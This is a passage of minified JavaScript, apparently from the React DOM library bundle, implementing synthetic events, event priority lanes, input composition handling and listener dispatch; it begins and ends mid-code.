r.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Oo=null;function Do(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Mo=null,Ws=null,Vs=null;function Kd(t){if(t=ha(t)){if(typeof Mo!="function")throw Error(s(280));var r=t.stateNode;r&&(r=bi(r),Mo(t.stateNode,t.type,r))}}function Yd(t){Ws?Vs?Vs.push(t):Vs=[t]:Ws=t}function Jd(){if(Ws){var t=Ws,r=Vs;if(Vs=Ws=null,Kd(t),r)for(t=0;t<r.length;t++)Kd(r[t])}}function Xd(t,r){return t(r)}function Zd(){}var $o=!1;function eu(t,r,l){if($o)return t(r,l);$o=!0;try{return Xd(t,r,l)}finally{$o=!1,(Ws!==null||Vs!==null)&&(Zd(),Jd())}}function Vn(t,r){var l=t.stateNode;if(l===null)return null;var u=bi(l);if(u===null)return null;l=u[r];e:switch(r){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(u=!u.disabled)||(t=t.type,u=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!u;break e;default:t=!1}if(t)return null;if(l&&typeof l!="function")throw Error(s(231,r,typeof l));return l}var Bo=!1;if(m)try{var Hn={};Object.defineProperty(Hn,"passive",{get:function(){Bo=!0}}),window.addEventListener("test",Hn,Hn),window.removeEventListener("test",Hn,Hn)}catch{Bo=!1}function mp(t,r,l,u,h,g,y,_,A){var $=Array.prototype.slice.call(arguments,3);try{r.apply(l,$)}catch(J){this.onError(J)}}var Gn=!1,Ya=null,Ja=!1,Uo=null,pp={onError:function(t){Gn=!0,Ya=t}};function xp(t,r,l,u,h,g,y,_,A){Gn=!1,Ya=null,mp.apply(pp,arguments)}function gp(t,r,l,u,h,g,y,_,A){if(xp.apply(this,arguments),Gn){if(Gn){var $=Ya;Gn=!1,Ya=null}else throw Error(s(198));Ja||(Ja=!0,Uo=$)}}function js(t){var r=t,l=t;if(t.alternate)for(;r.return;)r=r.return;else{t=r;do r=t,(r.flags&4098)!==0&&(l=r.return),t=r.return;while(t)}return r.tag===3?l:null}function tu(t){if(t.tag===13){var r=t.memoizedState;if(r===null&&(t=t.alternate,t!==null&&(r=t.memoizedState)),r!==null)return r.dehydrated}return null}function ru(t){if(js(t)!==t)throw Error(s(188))}function bp(t){var r=t.alternate;if(!r){if(r=js(t),r===null)throw Error(s(188));return r!==t?null:t}for(var l=t,u=r;;){var h=l.return;if(h===null)break;var g=h.alternate;if(g===null){if(u=h.return,u!==null){l=u;continue}break}if(h.child===g.child){for(g=h.child;g;){if(g===l)return ru(h),t;if(g===u)return ru(h),r;g=g.sibling}throw Error(s(188))}if(l.return!==u.return)l=h,u=g;else{for(var y=!1,_=h.child;_;){if(_===l){y=!0,l=h,u=g;break}if(_===u){y=!0,u=h,l=g;break}_=_.sibling}if(!y){for(_=g.child;_;){if(_===l){y=!0,l=g,u=h;break}if(_===u){y=!0,u=g,l=h;break}_=_.sibling}if(!y)throw Error(s(189))}}if(l.alternate!==u)throw Error(s(190))}if(l.tag!==3)throw Error(s(188));return l.stateNode.current===l?t:r}function su(t){return t=bp(t),t!==null?nu(t):null}function nu(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var r=nu(t);if(r!==null)return r;t=t.sibling}return null}var au=n.unstable_scheduleCallback,iu=n.unstable_cancelCallback,vp=n.unstable_shouldYield,yp=n.unstable_requestPaint,Qe=n.unstable_now,wp=n.unstable_getCurrentPriorityLevel,zo=n.unstable_ImmediatePriority,ou=n.unstable_UserBlockingPriority,Xa=n.unstable_NormalPriority,jp=n.unstable_LowPriority,lu=n.unstable_IdlePriority,Za=null,dr=null;function Np(t){if(dr&&typeof dr.onCommitFiberRoot=="function")try{dr.onCommitFiberRoot(Za,t,void 0,(t.current.flags&128)===128)}catch{}}var Xt=Math.clz32?Math.clz32:_p,kp=Math.log,Fp=Math.LN2;function _p(t){return t>>>=0,t===0?32:31-(kp(t)/Fp|0)|0}var ei=64,ti=4194304;function Qn(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function ri(t,r){var l=t.pendingLanes;if(l===0)return 0;var u=0,h=t.suspendedLanes,g=t.pingedLanes,y=l&268435455;if(y!==0){var _=y&~h;_!==0?u=Qn(_):(g&=y,g!==0&&(u=Qn(g)))}else y=l&~h,y!==0?u=Qn(y):g!==0&&(u=Qn(g));if(u===0)return 0;if(r!==0&&r!==u&&(r&h)===0&&(h=u&-u,g=r&-r,h>=g||h===16&&(g&4194240)!==0))return r;if((u&4)!==0&&(u|=l&16),r=t.entangledLanes,r!==0)for(t=t.entanglements,r&=u;0<r;)l=31-Xt(r),h=1<<l,u|=t[l],r&=~h;return u}function Sp(t,r){switch(t){case 1:case 2:case 4:return r+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return r+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Ap(t,r){for(var l=t.suspendedLanes,u=t.pingedLanes,h=t.expirationTimes,g=t.pendingLanes;0<g;){var y=31-Xt(g),_=1<<y,A=h[y];A===-1?((_&l)===0||(_&u)!==0)&&(h[y]=Sp(_,r)):A<=r&&(t.expiredLanes|=_),g&=~_}}function qo(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function cu(){var t=ei;return ei<<=1,(ei&4194240)===0&&(ei=64),t}function Wo(t){for(var r=[],l=0;31>l;l++)r.push(t);return r}function Kn(t,r,l){t.pendingLanes|=r,r!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,r=31-Xt(r),t[r]=l}function Ep(t,r){var l=t.pendingLanes&~r;t.pendingLanes=r,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=r,t.mutableReadLanes&=r,t.entangledLanes&=r,r=t.entanglements;var u=t.eventTimes;for(t=t.expirationTimes;0<l;){var h=31-Xt(l),g=1<<h;r[h]=0,u[h]=-1,t[h]=-1,l&=~g}}function Vo(t,r){var l=t.entangledLanes|=r;for(t=t.entanglements;l;){var u=31-Xt(l),h=1<<u;h&r|t[u]&r&&(t[u]|=r),l&=~h}}var Re=0;function du(t){return t&=-t,1<t?4<t?(t&268435455)!==0?16:536870912:4:1}var uu,Ho,hu,fu,mu,Go=!1,si=[],Br=null,Ur=null,zr=null,Yn=new Map,Jn=new Map,qr=[],Cp="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function pu(t,r){switch(t){case"focusin":case"focusout":Br=null;break;case"dragenter":case"dragleave":Ur=null;break;case"mouseover":case"mouseout":zr=null;break;case"pointerover":case"pointerout":Yn.delete(r.pointerId);break;case"gotpointercapture":case"lostpointercapture":Jn.delete(r.pointerId)}}function Xn(t,r,l,u,h,g){return t===null||t.nativeEvent!==g?(t={blockedOn:r,domEventName:l,eventSystemFlags:u,nativeEvent:g,targetContainers:[h]},r!==null&&(r=ha(r),r!==null&&Ho(r)),t):(t.eventSystemFlags|=u,r=t.targetContainers,h!==null&&r.indexOf(h)===-1&&r.push(h),t)}function Tp(t,r,l,u,h){switch(r){case"focusin":return Br=Xn(Br,t,r,l,u,h),!0;case"dragenter":return Ur=Xn(Ur,t,r,l,u,h),!0;case"mouseover":return zr=Xn(zr,t,r,l,u,h),!0;case"pointerover":var g=h.pointerId;return Yn.set(g,Xn(Yn.get(g)||null,t,r,l,u,h)),!0;case"gotpointercapture":return g=h.pointerId,Jn.set(g,Xn(Jn.get(g)||null,t,r,l,u,h)),!0}return!1}function xu(t){var r=Ns(t.target);if(r!==null){var l=js(r);if(l!==null){if(r=l.tag,r===13){if(r=tu(l),r!==null){t.blockedOn=r,mu(t.priority,function(){hu(l)});return}}else if(r===3&&l.stateNode.current.memoizedState.isDehydrated){t.blockedOn=l.tag===3?l.stateNode.containerInfo:null;return}}}t.blockedOn=null}function ni(t){if(t.blockedOn!==null)return!1;for(var r=t.targetContainers;0<r.length;){var l=Ko(t.domEventName,t.eventSystemFlags,r[0],t.nativeEvent);if(l===null){l=t.nativeEvent;var u=new l.constructor(l.type,l);Oo=u,l.target.dispatchEvent(u),Oo=null}else return r=ha(l),r!==null&&Ho(r),t.blockedOn=l,!1;r.shift()}return!0}function gu(t,r,l){ni(t)&&l.delete(r)}function Pp(){Go=!1,Br!==null&&ni(Br)&&(Br=null),Ur!==null&&ni(Ur)&&(Ur=null),zr!==null&&ni(zr)&&(zr=null),Yn.forEach(gu),Jn.forEach(gu)}function Zn(t,r){t.blockedOn===r&&(t.blockedOn=null,Go||(Go=!0,n.unstable_scheduleCallback(n.unstable_NormalPriority,Pp)))}function ea(t){function r(h){return Zn(h,t)}if(0<si.length){Zn(si[0],t);for(var l=1;l<si.length;l++){var u=si[l];u.blockedOn===t&&(u.blockedOn=null)}}for(Br!==null&&Zn(Br,t),Ur!==null&&Zn(Ur,t),zr!==null&&Zn(zr,t),Yn.forEach(r),Jn.forEach(r),l=0;l<qr.length;l++)u=qr[l],u.blockedOn===t&&(u.blockedOn=null);for(;0<qr.length&&(l=qr[0],l.blockedOn===null);)xu(l),l.blockedOn===null&&qr.shift()}var Hs=U.ReactCurrentBatchConfig,ai=!0;function Rp(t,r,l,u){var h=Re,g=Hs.transition;Hs.transition=null;try{Re=1,Qo(t,r,l,u)}finally{Re=h,Hs.transition=g}}function Ip(t,r,l,u){var h=Re,g=Hs.transition;Hs.transition=null;try{Re=4,Qo(t,r,l,u)}finally{Re=h,Hs.transition=g}}function Qo(t,r,l,u){if(ai){var h=Ko(t,r,l,u);if(h===null)hl(t,r,u,ii,l),pu(t,u);else if(Tp(h,t,r,l,u))u.stopPropagation();else if(pu(t,u),r&4&&-1<Cp.indexOf(t)){for(;h!==null;){var g=ha(h);if(g!==null&&uu(g),g=Ko(t,r,l,u),g===null&&hl(t,r,u,ii,l),g===h)break;h=g}h!==null&&u.stopPropagation()}else hl(t,r,u,null,l)}}var ii=null;function Ko(t,r,l,u){if(ii=null,t=Do(u),t=Ns(t),t!==null)if(r=js(t),r===null)t=null;else if(l=r.tag,l===13){if(t=tu(r),t!==null)return t;t=null}else if(l===3){if(r.stateNode.current.memoizedState.isDehydrated)return r.tag===3?r.stateNode.containerInfo:null;t=null}else r!==t&&(t=null);return ii=t,null}function bu(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(wp()){case zo:return 1;case ou:return 4;case Xa:case jp:return 16;case lu:return 536870912;default:return 16}default:return 16}}var Wr=null,Yo=null,oi=null;function vu(){if(oi)return oi;var t,r=Yo,l=r.length,u,h="value"in Wr?Wr.value:Wr.textContent,g=h.length;for(t=0;t<l&&r[t]===h[t];t++);var y=l-t;for(u=1;u<=y&&r[l-u]===h[g-u];u++);return oi=h.slice(t,1<u?1-u:void 0)}function li(t){var r=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&r===13&&(t=13)):t=r,t===10&&(t=13),32<=t||t===13?t:0}function ci(){return!0}function yu(){return!1}function Rt(t){function r(l,u,h,g,y){this._reactName=l,this._targetInst=h,this.type=u,this.nativeEvent=g,this.target=y,this.currentTarget=null;for(var _ in t)t.hasOwnProperty(_)&&(l=t[_],this[_]=l?l(g):g[_]);return this.isDefaultPrevented=(g.defaultPrevented!=null?g.defaultPrevented:g.returnValue===!1)?ci:yu,this.isPropagationStopped=yu,this}return Q(r.prototype,{preventDefault:function(){this.defaultPrevented=!0;var l=this.nativeEvent;l&&(l.preventDefault?l.preventDefault():typeof l.returnValue!="unknown"&&(l.returnValue=!1),this.isDefaultPrevented=ci)},stopPropagation:function(){var l=this.nativeEvent;l&&(l.stopPropagation?l.stopPropagation():typeof l.cancelBubble!="unknown"&&(l.cancelBubble=!0),this.isPropagationStopped=ci)},persist:function(){},isPersistent:ci}),r}var Gs={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Jo=Rt(Gs),ta=Q({},Gs,{view:0,detail:0}),Lp=Rt(ta),Xo,Zo,ra,di=Q({},ta,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:tl,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==ra&&(ra&&t.type==="mousemove"?(Xo=t.screenX-ra.screenX,Zo=t.screenY-ra.screenY):Zo=Xo=0,ra=t),Xo)},movementY:function(t){return"movementY"in t?t.movementY:Zo}}),wu=Rt(di),Op=Q({},di,{dataTransfer:0}),Dp=Rt(Op),Mp=Q({},ta,{relatedTarget:0}),el=Rt(Mp),$p=Q({},Gs,{animationName:0,elapsedTime:0,pseudoElement:0}),Bp=Rt($p),Up=Q({},Gs,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),zp=Rt(Up),qp=Q({},Gs,{data:0}),ju=Rt(qp),Wp={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Vp={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Hp={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Gp(t){var r=this.nativeEvent;return r.getModifierState?r.getModifierState(t):(t=Hp[t])?!!r[t]:!1}function tl(){return Gp}var Qp=Q({},ta,{key:function(t){if(t.key){var r=Wp[t.key]||t.key;if(r!=="Unidentified")return r}return t.type==="keypress"?(t=li(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?Vp[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:tl,charCode:function(t){return t.type==="keypress"?li(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?li(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),Kp=Rt(Qp),Yp=Q({},di,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Nu=Rt(Yp),Jp=Q({},ta,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:tl}),Xp=Rt(Jp),Zp=Q({},Gs,{propertyName:0,elapsedTime:0,pseudoElement:0}),ex=Rt(Zp),tx=Q({},di,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),rx=Rt(tx),sx=[9,13,27,32],rl=m&&"CompositionEvent"in window,sa=null;m&&"documentMode"in document&&(sa=document.documentMode);var nx=m&&"TextEvent"in window&&!sa,ku=m&&(!rl||sa&&8<sa&&11>=sa),Fu=" ",_u=!1;function Su(t,r){switch(t){case"keyup":return sx.indexOf(r.keyCode)!==-1;case"keydown":return r.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Au(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var Qs=!1;function ax(t,r){switch(t){case"compositionend":return Au(r);case"keypress":return r.which!==32?null:(_u=!0,Fu);case"textInput":return t=r.data,t===Fu&&_u?null:t;default:return null}}function ix(t,r){if(Qs)return t==="compositionend"||!rl&&Su(t,r)?(t=vu(),oi=Yo=Wr=null,Qs=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(r.ctrlKey||r.altKey||r.metaKey)||r.ctrlKey&&r.altKey){if(r.char&&1<r.char.length)return r.char;if(r.which)return String.fromCharCode(r.which)}return null;case"compositionend":return ku&&r.locale!=="ko"?null:r.data;default:return null}}var ox={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Eu(t){var r=t&&t.nodeName&&t.nodeName.toLowerCase();return r==="input"?!!ox[t.type]:r==="textarea"}function Cu(t,r,l,u){Yd(u),r=pi(r,"onChange"),0<r.length&&(l=new Jo("onChange","change",null,l,u),t.push({event:l,listeners:r}))}var na=null,aa=null;function lx(t){Qu(t,0)}function ui(t){var r=Zs(t);if(rt(r))return t}function cx(t,r){if(t==="change")return r}var Tu=!1;if(m){var sl;if(m){var nl="oninput"in document;if(!nl){var Pu=document.createElement("div");Pu.setAttribute("oninput","return;"),nl=typeof Pu.oninput=="function"}sl=nl}else sl=!1;Tu=sl&&(!document.documentMode||9<document.documentMode)}function Ru(){na&&(na.detachEvent("onpropertychange",Iu),aa=na=null)}function Iu(t){if(t.propertyName==="value"&&ui(aa)){var r=[];Cu(r,aa,t,Do(t)),eu(lx,r)}}function dx(t,r,l){t==="focusin"?(Ru(),na=r,aa=l,na.attachEvent("onpropertychange",Iu)):t==="focusout"&&Ru()}function ux(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return ui(aa)}function hx(t,r){if(t==="click")return ui(r)}function fx(t,r){if(t==="input"||t==="change")return ui(r)}function mx(t,r){return t===r&&(t!==0||1/t===1/r)||t!==t&&r!==r}var Zt=typeof Object.is=="function"?Object.is:mx;function ia(t,r){if(Zt(t,r))return!0;if(typeof t!="object"||t===null||typeof r!="object"||r===null)return!1;var l=Object.keys(t),u=Object.keys(r);if(l.length!==u.length)return!1;for(u=0;u<l.length;u++){var h=l[u];if(!f.call(r,h)||!Zt(t[h],r[h]))return!1}return!0}function Lu(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function Ou(t,r){var l=Lu(t);t=0;for(var u;l;){if(l.nodeType===3){if(u=t+l.textContent.length,t<=r&&u>=r)return{node:l,offset:r-t};t=u}e:{for(;l;){if(l.nextSibling){l=l.nextSibling;break e}l=l.parentNode}l=void 0}l=Lu(l)}}function Du(t,r){return t&&r?t===r?!0:t&&t.nodeType===3?!1:r&&r.nodeType===3?Du(t,r.parentNode):"contains"in t?t.contains(r):t.compareDocumentPosition?!!(t.compareDocumentPosition(r)&16):!1:!1}function Mu(){for(var t=window,r=yt();r instanceof t.HTMLIFrameElement;){try{var l=typeof r.contentWindow.location.href=="string"}catch{l=!1}if(l)t=r.contentWindow;else break;r=yt(t.document)}return r}function al(t){var r=t&&t.nodeName&&t.nodeName.toLowerCase();return r&&(r==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||r==="textarea"||t.contentEditable==="true")}function px(t){var r=Mu(),l=t.focusedElem,u=t.selectionRange;if(r!==l&&l&&l.ownerDocument&&Du(l.ownerDocument.documentElement,l)){if(u!==null&&al(l)){if(r=u.start,t=u.end,t===void 0&&(t=r),"selectionStart"in l)l.selectionStart=r,l.selectionEnd=Math.min(t,l.value.length);else if(t=(r=l.ownerDocument||document)&&r.defaultView||window,t.getSelection){t=t.getSelection();var h=l.textContent.length,g=Math.min(u.start,h);u=u.end===void 0?g:Math.min(u.end,h),!t.extend&&g>u&&(h=u,u=g,g=h),h=Ou(l,g);var y=Ou(l,u);h&&y&&(t.rangeCount!==1||t.anchorNode!==h.node||t.anchorOffset!==h.offset||t.focusNode!==y.node||t.focusOffset!==y.offset)&&(r=r.createRange(),r.setStart(h.node,h.offset),t.removeAllRanges(),g>u?(t.addRange(r),t.extend(y.node,y.offset)):(r.setEnd(y.node,y.offset),t.addRange(r)))}}for(r=[],t=l;t=t.parentNode;)t.nodeType===1&&r.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof l.focus=="function"&&l.focus(),l=0;l<r.length;l++)t=r[l],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var xx=m&&"documentMode"in document&&11>=document.documentMode,Ks=null,il=null,oa=null,ol=!1;function $u(t,r,l){var u=l.window===l?l.document:l.nodeType===9?l:l.ownerDocument;ol||Ks==null||Ks!==yt(u)||(u=Ks,"selectionStart"in u&&al(u)?u={start:u.selectionStart,end:u.selectionEnd}:(u=(u.ownerDocument&&u.ownerDocument.defaultView||window).getSelection(),u={anchorNode:u.anchorNode,anchorOffset:u.anchorOffset,focusNode:u.focusNode,focusOffset:u.focusOffset}),oa&&ia(oa,u)||(oa=u,u=pi(il,"onSelect"),0<u.length&&(r=new Jo("onSelect","select",null,r,l),t.push({event:r,listeners:u}),r.target=Ks)))}function hi(t,r){var l={};return l[t.toLowerCase()]=r.toLowerCase(),l["Webkit"+t]="webkit"+r,l["Moz"+t]="moz"+r,l}var Ys={animationend:hi("Animation","AnimationEnd"),animationiteration:hi("Animation","AnimationIteration"),animationstart:hi("Animation","AnimationStart"),transitionend:hi("Transition","TransitionEnd")},ll={},Bu={};m&&(Bu=document.createElement("div").style,"AnimationEvent"in window||(delete Ys.animationend.animation,delete Ys.animationiteration.animation,delete Ys.animationstart.animation),"TransitionEvent"in window||delete Ys.transitionend.transition);function fi(t){if(ll[t])return ll[t];if(!Ys[t])return t;var r=Ys[t],l;for(l in r)if(r.hasOwnProperty(l)&&l in Bu)return ll[t]=r[l];return t}var Uu=fi("animationend"),zu=fi("animationiteration"),qu=fi("animationstart"),Wu=fi("transitionend"),Vu=new Map,Hu="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Vr(t,r){Vu.set(t,r),c(r,[t])}for(var cl=0;cl<Hu.length;cl++){var dl=Hu[cl],gx=dl.toLowerCase(),bx=dl[0].toUpperCase()+dl.slice(1);Vr(gx,"on"+bx)}Vr(Uu,"onAnimationEnd"),Vr(zu,"onAnimationIteration"),Vr(qu,"onAnimationStart"),Vr("dblclick","onDoubleClick"),Vr("focusin","onFocus"),Vr("focusout","onBlur"),Vr(Wu,"onTransitionEnd"),d("onMouseEnter",["mouseout","mouseover"]),d("onMouseLeave",["mouseout","mouseover"]),d("onPointerEnter",["pointerout","pointerover"]),d("onPointerLeave",["pointerout","pointerover"]),c("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),c("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),c("onBeforeInput",["compositionend","keypress","textInput","paste"]),c("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var la="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),vx=new Set("cancel close invalid load scroll toggle".split(" ").concat(la));function Gu(t,r,l){var u=t.type||"unknown-event";t.currentTarget=l,gp(u,r,void 0,t),t.currentTarget=null}function Qu(t,r){r=(r&4)!==0;for(var l=0;l<t.length;l++){var u=t[l],h=u.event;u=u.listeners;e:{var g=void 0;if(r)for(var y=u.length-1;0<=y;y--){var _=u[y],A=_.instance,$=_.currentTarget;if(_=_.listener,A!==g&&h.isPropagationStopped())break e;Gu(h,_,$),g=A}else for(y=0;y<u.length;y++){if(_=u[y],A=_.instance,$=_.currentTarget,_=_.listener,A!==g&&h.isPropagationStopped())break e;Gu(h,_,$),g=A}}}if(Ja)throw t=Uo,Ja=!1,Uo=null,t}function $e(t,r){var l=r[bl];l===void 0&&(l=r[bl]=new Set);var u=t+"__bubble";l.has(u)||(Ku(r,t,2,!1),l.add(u))}function ul(t,r,l){var u=0;r&&(u|=4),Ku(l,t,u,r)}var mi="_reactListening"+Math.random().toString(36).slice(2);function ca(t){if(!t[mi]){t[mi]=!0,i.forEach(function(l){l!=="selectionchange"&&(vx.has(l)||ul(l,!1,t),ul(l,!0,t))});var r=t.nodeType===9?t:t.ownerDocument;r===null||r[mi]||(r[mi]=!0,ul("selectionchange",!1,r))}}function Ku(t,r,l,u){switch(bu(r)){case 1:var h=Rp;break;case 4:h=Ip;break;default:h=Qo}l=h.bind(null,r,l,t),h=void 0,!Bo||r!=="touchstart"&&r!=="touchmove"&&r!=="wheel"||(h=!0),u?h!==void 0?t.addEventListener(r,l,{capture:!0,passive:h}):t.addEventListener(r,l,!0):h!==void 0?t.addEventListener(r,l,{passive:h}):t.addEventListener(r,l,!1)}function hl(t,r,l,u,h){var g=u;if((r&1)===0&&(r&2)===0&&u!==null)e:for(;;){if(u===null)return;var y=u.tag;if(y===3||y===4){var _=u.stateNode.containerInfo;if(_===h||_.nodeType===8&&_.parentNode===h)break;if(y===4)for(y=u.return;y!==null;){var A=y.tag;if((A===3||A===4)&&(A=y.stateNode.containerInfo,A===h||A.nodeType===8&&A.parentNode===h))return;y=y.return}for(;_!==null;){if(y=Ns(_),y===null)return;if(A=y.tag,A===5||A===6){u=g=y;continue e}_=_.parentNode}}u=u.return}eu(function(){var $=g,J=Do(l),X=[];e:{var Y=Vu.get(t);if(Y!==void 0){var oe=Jo,de=t;switch(t){case"keypress":if(li(l)===0)break e;case"keydown":case"keyup":oe=Kp;break;case"focusin":de="focus",oe=el;break;case"focusout":de="blur",oe=el;break;case"beforeblur":case"afterblur":oe=el;break;case"click":if(l.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":oe=wu;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":oe=Dp;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":oe=Xp;break;case Uu:case zu:case qu:oe=Bp;break;case Wu:oe=ex;break;case"scroll":oe=Lp;break;case"wheel":oe=rx;break;case"copy":case"cut":case"paste":oe=zp;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":oe=Nu}var me=(r&4)!==0,Ke=!me&&t==="scroll",L=me?Y!==null?Y+"Capture":null:Y;me=[];for(var C=$,D;C!==null;){D=C;var te=D.stateNode;if(D.tag===5&&te!==null&&(D=te,L!==null&&(te=Vn(C,L),te!=null&&me.push(da(C,te,D)))),Ke)break;C=C.return}0<me.length&&(Y=new oe(Y,de,null,l,J),X.push({event:Y,listeners:me}))}}if((r&7)===0){e:{if(Y=t==="mouseover"||t==="pointerover",oe=t==="mouseout"||t==="pointerout",Y&&l!==Oo&&(de=l.relatedTarget||l.fromElement)&&(Ns(de)||de[yr]))break 